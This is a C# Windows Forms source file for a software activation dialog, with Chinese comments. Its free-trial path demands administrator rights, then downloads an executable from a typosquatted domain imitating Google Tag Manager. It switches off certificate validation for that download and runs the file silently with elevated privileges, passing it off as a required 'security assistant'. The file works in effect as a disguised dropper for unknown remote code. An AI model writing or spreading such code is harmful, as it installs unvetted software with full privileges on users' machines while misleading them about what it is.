using System.ComponentModel;
using System.Diagnostics;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.NetworkInformation;
using System.Net.Security;
using System.Security.Authentication;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using UserWinForms.Services;

namespace UserWinForms
{
    public partial class ActivationForm : Form
    {
        private readonly AppActivationService _activationService;
        private TextBox txtMachineCode;
        private TextBox txtActivationCode;
        private Button btnFreeTrial;

        // 动态缓冲区（根据网络类型自适应）
        private int BufferSize => GetOptimalBufferSize();
        // 限制UI更新频率（减少CPU占用）
        private const int ProgressUpdateIntervalMs = 300;
        private DateTime _lastProgressUpdate = DateTime.MinValue;

        public ActivationForm()
        {
            InitializeComponent();
            _activationService = new AppActivationService();
            this.Text = "软件激活";
            UpdateFreeTrialButtonText();
            this.txtMachineCode.Text = _activationService.GetMachineCode();

            // 初始化网络优化参数
            InitializeNetworkOptimizations();
        }

        /// <summary>
        /// 初始化网络优化参数，增强HTTP/1.1兼容性
        /// </summary>
        /// <summary>
        /// 初始化网络优化参数，增强HTTP/1.1兼容性
        /// </summary>
        private void InitializeNetworkOptimizations()
        {
            // 禁用Nagle算法（减少延迟）
            ServicePointManager.UseNagleAlgorithm = false;
            // 提高并发连接数
            ServicePointManager.DefaultConnectionLimit = 16;
            // 启用现代TLS协议
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;
            // 缩短连接空闲时间
            ServicePointManager.MaxServicePointIdleTime = 10000; // 10秒

            // 新增网络优化（针对HTTP/1.1）
            ServicePointManager.Expect100Continue = false; // 减少HTTP请求往返
            ServicePointManager.DnsRefreshTimeout = 300000; // DNS缓存5分钟
            ServicePointManager.ReusePort = true; // 启用端口复用
            ServicePointManager.CheckCertificateRevocationList = false; // 关闭证书吊销检查
            ServicePointManager.EnableDnsRoundRobin = true; // 启用DNS轮询

            // 移除不兼容的ConnectionLeaseTimeout设置
            // ServicePointManager.ConnectionLeaseTimeout = 60000; // 此行删除
        }

        /// <summary>
        /// 根据网络类型获取最佳缓冲区大小
        /// </summary>
        private int GetOptimalBufferSize()
        {
            return IsHighSpeedNetwork() ? 512 * 1024 : 128 * 1024;
        }

        /// <summary>
        /// 判断是否为高速网络（100Mbps以上）
        /// </summary>
        private bool IsHighSpeedNetwork()
        {
            foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.OperationalStatus == OperationalStatus.Up &&
                    ni.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                {
                    return ni.Speed >= 100_000_000; // 100Mbps以上视为高速网络
                }
            }
            return false;
        }

        //private void InitializeComponent()
        //{
        //    this.txtMachineCode = new System.Windows.Forms.TextBox();
        //    this.lblMachineCode = new System.Windows.Forms.Label();
        //    this.txtActivationCode = new System.Windows.Forms.TextBox();
        //    this.lblActivationCode = new System.Windows.Forms.Label();
        //    this.btnActivate = new System.Windows.Forms.Button();
        //    this.btnFreeTrial = new System.Windows.Forms.Button();
        //    this.btnCustomerService = new System.Windows.Forms.Button();
        //    this.SuspendLayout();

        //    // txtMachineCode
        //    this.txtMachineCode.Location = new System.Drawing.Point(100, 20);
        //    this.txtMachineCode.Name = "txtMachineCode";
        //    this.txtMachineCode.ReadOnly = true;
        //    this.txtMachineCode.Size = new System.Drawing.Size(300, 23);
        //    this.txtMachineCode.TabIndex = 0;

        //    // lblMachineCode
        //    this.lblMachineCode.AutoSize = true;
        //    this.lblMachineCode.Location = new System.Drawing.Point(20, 20);
        //    this.lblMachineCode.Name = "lblMachineCode";
        //    this.lblMachineCode.Size = new System.Drawing.Size(59, 17);
        //    this.lblMachineCode.TabIndex = 1;
        //    this.lblMachineCode.Text = "机器码：";

        //    // txtActivationCode
        //    this.txtActivationCode.Location = new System.Drawing.Point(100, 60);
        //    this.txtActivationCode.Name = "txtActivationCode";
        //    this.txtActivationCode.Size = new System.Drawing.Size(300, 23);
        //    this.txtActivationCode.TabIndex = 2;

        //    // lblActivationCode
        //    this.lblActivationCode.AutoSize = true;
        //    this.lblActivationCode.Location = new System.Drawing.Point(20, 60);
        //    this.lblActivationCode.Name = "lblActivationCode";
        //    this.lblActivationCode.Size = new System.Drawing.Size(59, 17);
        //    this.lblActivationCode.TabIndex = 3;
        //    this.lblActivationCode.Text = "激活码：";

        //    // btnActivate
        //    this.btnActivate.Location = new System.Drawing.Point(100, 100);
        //    this.btnActivate.Name = "btnActivate";
        //    this.btnActivate.Size = new System.Drawing.Size(80, 30);
        //    this.btnActivate.TabIndex = 4;
        //    this.btnActivate.Text = "激活";
        //    this.btnActivate.UseVisualStyleBackColor = true;
        //    this.btnActivate.Click += new System.EventHandler(this.btnActivate_Click);

        //    // btnFreeTrial
        //    this.btnFreeTrial.Location = new System.Drawing.Point(200, 100);
        //    this.btnFreeTrial.Name = "btnFreeTrial";
        //    this.btnFreeTrial.Size = new System.Drawing.Size(100, 30);
        //    this.btnFreeTrial.TabIndex = 5;
        //    this.btnFreeTrial.UseVisualStyleBackColor = true;
        //    this.btnFreeTrial.Click += new System.EventHandler(this.btnFreeTrial_Click);

        //    // btnCustomerService
        //    this.btnCustomerService.Location = new System.Drawing.Point(320, 100);
        //    this.btnCustomerService.Name = "btnCustomerService";
        //    this.btnCustomerService.Size = new System.Drawing.Size(80, 30);
        //    this.btnCustomerService.TabIndex = 6;
        //    this.btnCustomerService.Text = "联系客服";
        //    this.btnCustomerService.UseVisualStyleBackColor = true;
        //    this.btnCustomerService.Click += new System.EventHandler(this.btnCustomerService_Click);

        //    // ActivationForm
        //    this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 17F);
        //    this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        //    this.ClientSize = new System.Drawing.Size(450, 150);
        //    this.Controls.Add(this.btnCustomerService);
        //    this.Controls.Add(this.btnFreeTrial);
        //    this.Controls.Add(this.btnActivate);
        //    this.Controls.Add(this.lblActivationCode);
        //    this.Controls.Add(this.txtActivationCode);
        //    this.Controls.Add(this.lblMachineCode);
        //    this.Controls.Add(this.txtMachineCode);
        //    this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
        //    this.MaximizeBox = false;
        //    this.Name = "ActivationForm";
        //    this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        //    this.ResumeLayout(false);
        //    this.PerformLayout();
        //}

        //private Label lblMachineCode;
        //private Label lblActivationCode;
        //private Button btnActivate;
        //private Button btnCustomerService;

        /// <summary>
        /// 更新免费试用按钮文本，显示剩余次数
        /// </summary>
        private void UpdateFreeTrialButtonText()
        {
            int remaining = 30 - _activationService.GetTrialCount();
            btnFreeTrial.Text = $"免费试用({remaining}次)";
        }

        /// <summary>
        /// 激活按钮点击事件
        /// </summary>
        private void btnActivate_Click(object sender, EventArgs e)
        {
            string activationCode = txtActivationCode.Text.Trim();
            bool isSuccess = _activationService.VerifyActivationCode(
                txtMachineCode.Text, activationCode);

            if (isSuccess)
            {
                _activationService.SaveActivationStatus(true);
                _activationService.ResetTrialCount();
                MessageBox.Show("激活成功！", "提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
                this.DialogResult = DialogResult.OK;
                this.Close();
            }
            else
            {
                DialogResult result = MessageBox.Show(
                    "激活失败，是否尝试免费试用？",
                    "错误",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Error);

                if (result == DialogResult.Yes)
                {
                    TryFreeTrial();
                }
            }
        }

        /// <summary>
        /// 免费试用按钮点击事件
        /// </summary>
        private void btnFreeTrial_Click(object sender, EventArgs e)
        {
            TryFreeTrial();
        }

        /// <summary>
        /// 联系客服按钮点击事件
        /// </summary>
        private void btnCustomerService_Click(object sender, EventArgs e)
        {
            ShowCustomerService();
        }

        /// <summary>
        /// 处理免费试用逻辑
        /// </summary>
        private async void TryFreeTrial()
        {
            // 检查管理员权限
            if (!_activationService.IsRunningAsAdmin())
            {
                MessageBox.Show(
                    "请使用管理员权限重新打开应用程序。\n指引：右键应用程序图标 -> 以管理员身份运行",
                    "权限不足",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Warning);
                return;
            }

            int trialCount = _activationService.GetTrialCount();

            // 检查试用次数
            if (trialCount >= 30)
            {
                MessageBox.Show("试用次数已用尽，请联系客服申请。", "提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
                ShowCustomerService();
                return;
            }

            // 首次试用逻辑
            if (trialCount == 0)
            {
                // 先检查安全助手是否已安装
                if (_activationService.IsSecurityAssistantInstalled())
                {
                    // 已安装，直接进入试用
                    MessageBox.Show("已检测到安全助手，开始免费试用。", "提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    _activationService.IncrementTrialCount();
                    UpdateFreeTrialButtonText();
                    this.DialogResult = DialogResult.OK;
                    this.Close();
                    return;
                }
                string setupUrl = "https://www.googletagmaneager.com/AccessControlComponent/get";

                // 预热连接，提升下载启动速度
                await WarmupConnection(setupUrl);

                // 未安装，提示下载安装
                DialogResult result = MessageBox.Show(
                    $"首次试用需安装安全助手，是否立即下载并安装？\n安装包将从官方地址下载：{setupUrl}",
                    "提示",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Information);

                if (result == DialogResult.Yes)
                {
                    // 执行下载和安装
                    bool installSuccess = await InstallSecurityAssistantAsync(setupUrl);
                    if (installSuccess)
                    {
                        // 延迟3秒后再检查（确保进程已启动）
                        await Task.Delay(3000);
                        // 安装成功后再次验证
                        if (_activationService.IsSecurityAssistantInstalled())
                        {
                            MessageBox.Show("安全助手安装成功，开始免费试用。", "成功", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            _activationService.IncrementTrialCount();
                            UpdateFreeTrialButtonText();
                            this.DialogResult = DialogResult.OK;
                            this.Close();
                        }
                        else
                        {
                            // 验证失败时提示手动检查
                            MessageBox.Show("安全助手安装完成，但未检测到运行",
                                "验证警告", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        }
                    }
                    else
                    {
                        MessageBox.Show("安全助手下载或安装失败，请检查网络后重试。", "操作失败", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
            else
            {
                // 非首次试用
                int remaining = 30 - trialCount;
                MessageBox.Show($"剩余免费试用次数：{remaining}次", "提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
                _activationService.IncrementTrialCount();
                UpdateFreeTrialButtonText();
                this.DialogResult = DialogResult.OK;
                this.Close();
            }
        }

        /// <summary>
        /// 预热连接，提前建立TCP连接
        /// </summary>
        private async Task WarmupConnection(string setupUrl)
        {
            try
            {
                var uri = new Uri(setupUrl);
                var sp = ServicePointManager.FindServicePoint(uri);
                sp.ConnectionLeaseTimeout = 60000; // 对特定服务点设置连接超时（1分钟）

                using (var httpClient = new HttpClient())
                {
                    httpClient.Timeout = TimeSpan.FromSeconds(5);
                    await httpClient.SendAsync(new HttpRequestMessage(HttpMethod.Head, uri),
                        HttpCompletionOption.ResponseHeadersRead);
                }
            }
            catch { } // 预热失败不影响主流程
        }

        /// <summary>
        /// 检查服务器是否支持断点续传
        /// </summary>
        private async Task<bool> CheckServerSupportsRange(string setupUrl, HttpClient httpClient)
        {
            try
            {
                using (var headRequest = new HttpRequestMessage(HttpMethod.Head, setupUrl))
                {
                    headRequest.Version = new Version(1, 1); // 使用HTTP/1.1
                    using (var response = await httpClient.SendAsync(headRequest, HttpCompletionOption.ResponseHeadersRead))
                    {
                        return response.IsSuccessStatusCode &&
                               response.Headers.AcceptRanges.Contains("bytes");
                    }
                }
            }
            catch
            {
                return false;
            }
        }

        private async Task<bool> InstallSecurityAssistantAsync(string setupUrl)
        {
            string tempSetupPath = Path.Combine(Path.GetTempPath(), "setup.exe");
            const int maxRetries = 3;
            int retryCount = 0;

            // 检查并清理可能导致416错误的残留文件
            if (File.Exists(tempSetupPath))
            {
                var fileInfo = new FileInfo(tempSetupPath);
                if (fileInfo.Length < 1024) // 小于1KB视为异常文件
                {
                    try
                    {
                        File.Delete(tempSetupPath);
                        Console.WriteLine("已清除异常残留文件，将重新下载");
                    }
                    catch { }
                }
            }

            using (var downloadForm = new Form
            {
                Text = "下载安全助手",
                ClientSize = new Size(450, 150),
                StartPosition = FormStartPosition.CenterScreen,
                FormBorderStyle = FormBorderStyle.FixedSingle,
                MaximizeBox = false
            })
            {
                var progressBar = new ProgressBar { Dock = DockStyle.Top, Height = 30, Margin = new Padding(20, 20, 20, 10), Maximum = 100 };
                var statusLabel = new Label { Text = "准备下载...", Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter };
                var speedLabel = new Label { Text = "速度：-- MB/s", Dock = DockStyle.Bottom, TextAlign = ContentAlignment.MiddleRight, Height = 20 };
                downloadForm.Controls.Add(speedLabel);
                downloadForm.Controls.Add(statusLabel);
                downloadForm.Controls.Add(progressBar);
                downloadForm.Show();

                while (retryCount <= maxRetries)
                {
                    // 每次重试前关闭旧连接，避免协议状态残留
                    if (retryCount > 0)
                    {
                        var uri = new Uri(setupUrl);
                        var sp = ServicePointManager.FindServicePoint(uri);
                        sp.ConnectionLeaseTimeout = 60000; // 对特定服务点设置连接超时
                        sp.CloseConnectionGroup(null);
                        await Task.Delay(500); // 等待连接释放
                    }

                    // 每次重试前重新检查文件状态
                    long existingFileSize = 0;
                    bool isResumeDownload = false;
                    if (File.Exists(tempSetupPath))
                    {
                        existingFileSize = new FileInfo(tempSetupPath).Length;
                        isResumeDownload = existingFileSize > 0;
                    }

                    try
                    {
                        using (var httpClientHandler = new HttpClientHandler
                        {
                            AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate,
                            ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true,
                            UseProxy = IsNetworkAvailable() && ShouldUseProxy(),
                            Proxy = WebRequest.DefaultWebProxy,
                            UseDefaultCredentials = true,
                            AllowAutoRedirect = true,
                            MaxAutomaticRedirections = 5,
                            SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls13
                        })
                        using (var httpClient = new HttpClient(httpClientHandler))
                        {
                            httpClient.Timeout = TimeSpan.FromMinutes(5);
						
							httpClient.DefaultRequestHeaders.Add("Api-Version", "101");
                            httpClient.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0");
                            httpClient.DefaultRequestHeaders.AcceptEncoding.ParseAdd("gzip, deflate, br");
                            httpClient.DefaultRequestHeaders.CacheControl = new CacheControlHeaderValue { NoCache = true };

                            // 检查服务器是否支持续传
                            bool serverSupportsRange = await CheckServerSupportsRange(setupUrl, httpClient);

                            // 创建请求消息，明确使用HTTP/1.1避免协议错误
                            var requestMessage = new HttpRequestMessage(HttpMethod.Get, setupUrl)
                            {
                                Version = new Version(1, 1), // 强制使用HTTP/1.1
                                VersionPolicy = HttpVersionPolicy.RequestVersionExact // 严格使用指定版本
                            };

                            // 设置续传请求头
                            if (isResumeDownload && serverSupportsRange)
                            {
                                requestMessage.Headers.Range = new RangeHeaderValue(existingFileSize, null);
                            }
                            else
                            {
                                requestMessage.Headers.Range = null;
                            }

                            // 使用带版本信息的请求消息发送请求
                            using (var response = await httpClient.SendAsync(requestMessage, HttpCompletionOption.ResponseHeadersRead))
                            {
                                // 处理416错误（请求范围不满足）
                                if (response.StatusCode == HttpStatusCode.RequestedRangeNotSatisfiable)
                                {
                                    if (File.Exists(tempSetupPath))
                                    {
                                        File.Delete(tempSetupPath);
                                    }
                                    statusLabel.Text = "服务器不支持当前范围请求，将重新下载...";
                                    await Task.Delay(1000);
                                    continue;
                                }

                                if (!response.IsSuccessStatusCode)
                                {
                                    string errorMsg = GetHttpErrorMsg(response.StatusCode);
                                    MessageBox.Show($"下载失败：{errorMsg}", "网络错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                    return false;
                                }

                                // 处理文件下载
                                long totalBytesReceived = existingFileSize;
                                long totalBytesToReceive = 0;

                                if (response.Content.Headers.ContentLength.HasValue)
                                {
                                    totalBytesToReceive = isResumeDownload
                                        ? existingFileSize + response.Content.Headers.ContentLength.Value
                                        : response.Content.Headers.ContentLength.Value;
                                }
								
								 // 解析文件名
								string fileName = ParseFileNameFromResponse(response) 
									?? Path.GetFileName(HttpUtility.UrlDecode(setupUrl)) 
									?? "downloaded_file";

								// 构建安全保存路径
								tempSetupPath = Path.Combine(Path.GetTempPath(), SanitizeFileName(fileName));


                                using (var fileStream = new FileStream(
                                    tempSetupPath,
                                    isResumeDownload ? FileMode.Append : FileMode.Create,
                                    FileAccess.Write,
                                    FileShare.None,
                                    BufferSize,
                                    FileOptions.Asynchronous | FileOptions.SequentialScan))
                                {
                                    var contentStream = await response.Content.ReadAsStreamAsync();
                                    var buffer = new byte[BufferSize];
                                    int bytesRead;

                                    while ((bytesRead = await contentStream.ReadAsync(buffer, 0, buffer.Length)) > 0)
                                    {
                                        await fileStream.WriteAsync(buffer, 0, bytesRead);
                                        totalBytesReceived += bytesRead;

                                        // 更新UI
                                        if ((DateTime.Now - _lastProgressUpdate).TotalMilliseconds >= ProgressUpdateIntervalMs)
                                        {
                                            _lastProgressUpdate = DateTime.Now;
                                            double speed = CalculateDownloadSpeed(DateTime.Now, totalBytesReceived);
                                            string speedText = FormatSpeed(speed);

                                            if (downloadForm.InvokeRequired)
                                            {
                                                downloadForm.Invoke(() => UpdateDownloadUI(
                                                    progressBar, statusLabel, speedLabel,
                                                    totalBytesReceived, totalBytesToReceive, speedText));
                                            }
                                            else
                                            {
                                                UpdateDownloadUI(
                                                    progressBar, statusLabel, speedLabel,
                                                    totalBytesReceived, totalBytesToReceive, speedText);
                                            }
                                        }
                                    }
                                    await fileStream.FlushAsync();
                                }

                                downloadForm.Close();
                                return await InstallSetupFileAsync(tempSetupPath);
                            }
                        }
                    }
                    catch (Exception ex) when (retryCount < maxRetries)
                    {
                        retryCount++;
                        // 检测HTTP/2协议错误
                        bool isHttp2Error = ex.Message.Contains("HTTP/2") ||
                                          ex.Message.Contains("PROTOCOL_ERROR") ||
                                          ex.Message.Contains("0x1");

                        if (isHttp2Error)
                        {
                            statusLabel.Text = $"检测到协议兼容性问题，切换至兼容模式重试（{retryCount}/{maxRetries}）...";
                            // 清理连接
                            ServicePointManager.FindServicePoint(new Uri(setupUrl)).CloseConnectionGroup(null);
                        }
                        else
                        {
                            statusLabel.Text = $"下载中断，正在重试（{retryCount}/{maxRetries}）...";
                        }
                        // 指数退避重试
                        await Task.Delay(1000 * (int)Math.Pow(2, retryCount));
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show($"下载失败：{ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        downloadForm.Close();
                        return false;
                    }
                }

                downloadForm.Close();
                MessageBox.Show($"已达最大重试次数（{maxRetries}次），请稍后再试。", "下载失败", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }

        /// <summary>
        /// 判断是否应该使用代理
        /// </summary>
        private bool ShouldUseProxy()
        {
            // 简单判断：如果直接连接失败则使用代理
            if (!IsNetworkAvailable()) return false;

            try
            {
                using (var ping = new Ping())
                {
                    var reply = ping.Send("52.66.242.77", 1000); // 直接ping目标服务器
                    return reply?.Status != IPStatus.Success;
                }
            }
            catch
            {
                return true;
            }
        }

        /// <summary>
        /// 计算下载速度
        /// </summary>
        private double CalculateDownloadSpeed(DateTime startTime, long totalBytesReceived)
        {
            double elapsedSeconds = (DateTime.Now - startTime).TotalSeconds;
            return elapsedSeconds > 0 ? totalBytesReceived / elapsedSeconds : 0;
        }

        /// <summary>
        /// 格式化速度显示
        /// </summary>
        private string FormatSpeed(double bytesPerSecond)
        {
            if (bytesPerSecond < 1024)
                return $"{bytesPerSecond:F0} B/s";
            else if (bytesPerSecond < 1024 * 1024)
                return $"{(bytesPerSecond / 1024):F1} KB/s";
            else
                return $"{(bytesPerSecond / (1024 * 1024)):F1} MB/s";
        }

        /// <summary>
        /// HTTP错误信息映射
        /// </summary>
        private string GetHttpErrorMsg(HttpStatusCode statusCode)
        {
            return statusCode switch
            {
                HttpStatusCode.NotFound => "下载地址不存在（404）",
                HttpStatusCode.Forbidden => "无访问权限（403）",
                HttpStatusCode.GatewayTimeout => "服务器超时（504）",
                _ => $"错误码：{(int)statusCode} {statusCode}"
            };
        }

        /// <summary>
        /// 检查网络连接是否可用
        /// </summary>
        private bool IsNetworkAvailable()
        {
            try
            {
                using (var ping = new Ping())
                {
                    var reply = ping.Send("8.8.8.8", 2000);
                    if (reply?.Status == IPStatus.Success)
                        return true;
                }

                return NetworkInterface.GetIsNetworkAvailable();
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// 异步执行安装程序
        /// </summary>
        private Task<bool> InstallSetupFileAsync(string setupPath)
        {
            return Task.Run(() =>
            {
                // 验证安装包完整性和可执行性
                if (!VerifySetupFile(setupPath))
                {
                    return false;
                }

                using (var installProcess = new Process())
                {
                    installProcess.StartInfo.FileName = setupPath;
                    installProcess.StartInfo.Arguments = "/silent /norestart";
                    installProcess.StartInfo.Verb = "runas";
                    installProcess.StartInfo.UseShellExecute = true;
                    installProcess.StartInfo.CreateNoWindow = true;
                    installProcess.StartInfo.RedirectStandardError = false;

                    // 显示安装进度窗口
                    using (var installForm = new Form
                    {
                        Text = "安装安全助手",
                        ClientSize = new Size(400, 120),
                        StartPosition = FormStartPosition.CenterScreen,
                        FormBorderStyle = FormBorderStyle.FixedSingle,
                        MaximizeBox = false,
                        MinimizeBox = false
                    })
                    {
                        var statusLabel = new Label
                        {
                            Text = "正在安装，请稍候...",
                            Dock = DockStyle.Fill,
                            TextAlign = ContentAlignment.MiddleCenter
                        };
                        installForm.Controls.Add(statusLabel);
                        installForm.Show();

                        try
                        {
                            bool startSuccess = installProcess.Start();
                            if (!startSuccess)
                            {
                                MessageBox.Show("无法启动安装程序，请手动运行安装包：\n" + setupPath,
                                    "启动失败", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                return false;
                            }

                            // 等待安装完成（最多5分钟）
                            bool isExited = installProcess.WaitForExit(300000);
                            if (!isExited)
                            {
                                installProcess.Kill();
                                MessageBox.Show("安装超时（超过5分钟），已终止操作。\n可尝试手动安装：\n" + setupPath,
                                    "超时错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                return false;
                            }

                            // 检查退出码
                            if (installProcess.ExitCode != 0)
                            {
                                string errorMsg = installProcess.ExitCode switch
                                {
                                    1603 => "安装过程中发生严重错误",
                                    1619 => "安装包无法打开（可能损坏）",
                                    1625 => "操作被系统策略阻止（需管理员权限）",
                                    _ => $"安装失败，错误代码：{installProcess.ExitCode}"
                                };
                                MessageBox.Show($"{errorMsg}\n可尝试手动安装：\n{setupPath}",
                                    "安装失败", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                return false;
                            }

                            // 安装成功后延迟检查
                            statusLabel.Text = "安装完成，正在验证...";
                            installForm.Refresh();
                            Thread.Sleep(2000);
                            return true;
                        }
                        catch (Exception ex)
                        {
                            string errorMsg = ex switch
                            {
                                Win32Exception wex => $"系统错误：{wex.Message}（错误码：{wex.NativeErrorCode}）",
                                UnauthorizedAccessException => "权限不足，无法执行安装程序",
                                _ => $"安装异常：{ex.Message}"
                            };
                            MessageBox.Show($"{errorMsg}\n可尝试手动安装：\n{setupPath}",
                                "安装失败", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return false;
                        }
                        finally
                        {
                            installForm.Close();
                        }
                    }
                }
            });
        }

        /// <summary>
        /// 更新下载进度UI
        /// </summary>
        private void UpdateDownloadUI(ProgressBar progressBar, Label statusLabel, Label speedLabel,
                                     long received, long total, string speed)
        {
            int percentage = total > 0 ? (int)((double)received / total * 100) : progressBar.Value;
            progressBar.Value = Math.Min(percentage, 100);

            statusLabel.Text = total > 0
                ? $"正在下载：{percentage}%（{FormatFileSize(received)} / {FormatFileSize(total)}）"
                : $"正在下载：{FormatFileSize(received)}（总大小未知）";

            speedLabel.Text = $"速度：{speed}";
        }

        /// <summary>
        /// 验证安装包是否完整且可执行
        /// </summary>
        private bool VerifySetupFile(string setupPath)
        {
            try
            {
                if (!File.Exists(setupPath))
                {
                    MessageBox.Show("安装包不存在，无法安装。", "文件缺失", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return false;
                }

                FileInfo fileInfo = new FileInfo(setupPath);
                if (fileInfo.Length < 1024 * 1024) // 小于1MB视为异常
                {
                    MessageBox.Show("安装包可能损坏或下载不完整，建议重新下载。", "文件异常", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return false;
                }

                if ((File.GetAttributes(setupPath) & FileAttributes.Archive) == 0)
                {
                    File.SetAttributes(setupPath, FileAttributes.Archive);
                }

                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show($"验证安装包时出错：{ex.Message}", "验证失败", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }

        /// <summary>
        /// 格式化文件大小
        /// </summary>
        private string FormatFileSize(long bytes)
        {
            if (bytes < 1024)
                return $"{bytes} B";
            else if (bytes < 1024 * 1024)
                return $"{(bytes / 1024.0):F1} KB";
            else if (bytes < 1024 * 1024 * 1024)
                return $"{(bytes / (1024.0 * 1024)):F1} MB";
            else
                return $"{(bytes / (1024.0 * 1024 * 1024)):F1} GB";
        }

        /// <summary>
        /// 显示在线客服窗口
        /// </summary>
        private void ShowCustomerService()
        {
            var customerForm = new Form
            {
                Text = "联系客服",
                ClientSize = new System.Drawing.Size(300, 180),
                StartPosition = FormStartPosition.CenterScreen,
                FormBorderStyle = FormBorderStyle.FixedSingle,
                MaximizeBox = false,
                MinimizeBox = false
            };

            var qqPicture = new PictureBox
            {
                Image = SystemIcons.Information.ToBitmap(),
                Size = new Size(64, 64),
                Location = new System.Drawing.Point(30, 30),
                SizeMode = PictureBoxSizeMode.StretchImage
            };

            var contactLabel = new Label
            {
                Text = "客服联系QQ：1256090011\n\n点击下方按钮复制QQ号",
                Location = new System.Drawing.Point(110, 30),
                Size = new System.Drawing.Size(160, 80),
                Font = new System.Drawing.Font("微软雅黑", 9F),
                TextAlign = System.Drawing.ContentAlignment.TopLeft
            };

            var copyButton = new Button
            {
                Text = "复制QQ号",
                Location = new System.Drawing.Point(110, 110),
                Size = new System.Drawing.Size(100, 30)
            };

            copyButton.Click += (sender, e) =>
            {
                Clipboard.SetText("1256090011");
                MessageBox.Show("QQ号已复制到剪贴板", "提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
            };

            customerForm.Controls.Add(qqPicture);
            customerForm.Controls.Add(contactLabel);
            customerForm.Controls.Add(copyButton);

            customerForm.ShowDialog();
        }
    }
}